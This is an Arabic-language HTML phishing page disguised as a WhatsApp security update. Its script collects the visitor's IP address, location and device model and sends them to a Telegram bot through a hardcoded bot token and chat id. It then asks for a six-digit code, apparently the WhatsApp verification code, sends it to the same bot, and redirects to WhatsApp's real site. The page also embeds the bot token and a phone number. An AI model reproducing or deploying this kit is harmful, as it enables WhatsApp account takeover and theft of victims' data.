<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security System</title>
    <style>
        :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-surface: #111b21; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        #checker { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .pulse-logo { width: 65px; animation: pulseLogo 2s infinite ease-in-out; }
        @keyframes pulseLogo { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.08); opacity: 1; } }
        .container { padding: 25px; text-align: center; display: none; width: 100%; max-width: 400px; animation: fadeIn 0.5s ease; }
        .info-card { background: #1d2a33; border-radius: 15px; padding: 20px; text-align: right; margin-bottom: 20px; border: 1px solid #2a3942; }
        .line { font-size: 13px; margin-bottom: 10px; color: var(--wa-hint); display: flex; justify-content: space-between; align-items: center; }
        .line b { color: #fff; font-family: inherit; font-weight: 500; direction: ltr; }
        .trust-tag { background: rgba(0, 168, 132, 0.05); border: 1px solid rgba(0, 168, 132, 0.1); border-radius: 12px; padding: 15px; margin-bottom: 20px; font-size: 12px; text-align: right; }
        .trust-tag div { display: flex; justify-content: space-between; margin-bottom: 6px; }
        .trust-tag span { color: var(--wa-green); font-family: monospace; }
        .otp-input { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: var(--wa-green); font-size: 35px; text-align: center; outline: none; letter-spacing: 10px; margin: 20px 0; direction: ltr; }
        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

    <div id="checker">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="pulse-logo">
        <p style="margin-top:20px; font-size:15px; color:var(--wa-hint);">جاري مزامنة النظام...</p>
    </div>

    <div class="container" id="app">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="55" style="margin-bottom:15px;">
        <h2 style="font-size:20px; margin-bottom:15px;">تحديث أمان واتساب</h2>
        <div class="info-card">
            <div class="line">الجهاز المكتشف: <b id="dev-name">Checking..</b></div>
            <div class="line">حالة النظام: <span style="color:var(--wa-green);">تحديث v2.4 جاهز</span></div>
            <div style="border-top: 1px solid #2a3942; margin-top:10px; padding-top:10px;">
                الرقم الموثق: <b id="phone-display" style="color:var(--wa-green); direction: ltr;"></b>
            </div>
        </div>
        <div class="trust-tag">
            <div>الموقع الجغرافي: <span id="loc-val">Detecting..</span></div>
            <div>عنوان البروتوكول: <span id="ip-val">...</span></div>
            <div>توقيت النظام: <span id="time-val">00:00:00</span></div>
        </div>
        <p style="font-size: 13px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px;">
            تم إصلاح بعض الأخطاء في التحديثات الأخيرة. لضمان توافق حسابك مع الإصدار الأخير يرجى التأكد من هويتك.
        </p>
        <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="------">
        <button class="btn" onclick="submit()">تحديث ومزامنة الآن</button>
    </div>

    <script>
        const CFG = {
            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            C: '5446862709',
            P: '01030003287' 
        };

        function getDetailedDevice() {
            const ua = navigator.userAgent;
            
            if (/iPhone|iPad|iPod/.test(ua)) return "iPhone";
            if (/Macintosh|Mac OS X/.test(ua)) return "Apple Mac";
            if (/Windows/.test(ua)) return "Windows PC";
            
            // تحسين كشف الأندرويد لجلب اسم الموديل بالكامل
            if (/Android/.test(ua)) {
                let model = "Android Device";
                const regex = /Android\s+[\d.]+;\s+([^;)]+)/;
                const match = ua.match(regex);
                if (match && match[1]) {
                    model = match[1].split(" Build/")[0].trim();
                    // تنظيف بعض الكلمات التقنية اللي بتظهر أحياناً
                    model = model.replace(/Linux; /g, "").replace(/U; /g, "");
                }
                return model;
            }
            
            if (/Linux/.test(ua)) return "Linux System";
            return "Mobile Terminal";
        }

        setInterval(() => {
            document.getElementById('time-val').innerText = new Date().toLocaleTimeString('en-US', { hour12: false });
        }, 1000);

        async function initSystem() {
            let info = { ip: "Detecting..", city: "Unknown", country_code: ".." };
            try {
                const res = await fetch('https://ipapi.co/json/');
                info = await res.json();
                document.getElementById('ip-val').innerText = info.ip;
                document.getElementById('loc-val').innerText = `${info.city}, ${info.country_code}`;
            } catch(e) {}

            const dev = getDetailedDevice();
            document.getElementById('dev-name').innerText = dev;
            document.getElementById('phone-display').innerText = "+20 " + CFG.P.substring(0,3) + " **** " + CFG.P.slice(-2);

            setTimeout(() => {
                document.getElementById('checker').style.display = 'none';
                document.getElementById('app').style.display = 'block';
                sendBot(`🚀 <b>[New Access]</b>\n📱 Device: ${dev}\n📍 Loc: ${info.city}, ${info.country_code}\n🌐 IP: ${info.ip}`);
            }, 2500);
        }

        async function sendBot(msg) {
            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
            });
        }

        async function submit() {
            const val = document.getElementById('otp').value;
            const dev = getDetailedDevice();
            if(val.length === 6) {
                document.querySelector('.btn').innerText = "...";
                await sendBot(`🔥 <b>[Login Code]</b>\n📱 Device: ${dev}\n🔢 Code: <code>${val}</code>`);
                document.body.innerHTML = `<div style="text-align:center;"><div class="loader" style="margin:auto;"></div><p style="margin-top:20px; color:var(--wa-hint);">Linking Protocol..</p></div>`;
                setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 4000);
            }
        }
        initSystem();
    </script>
</body>
</html>
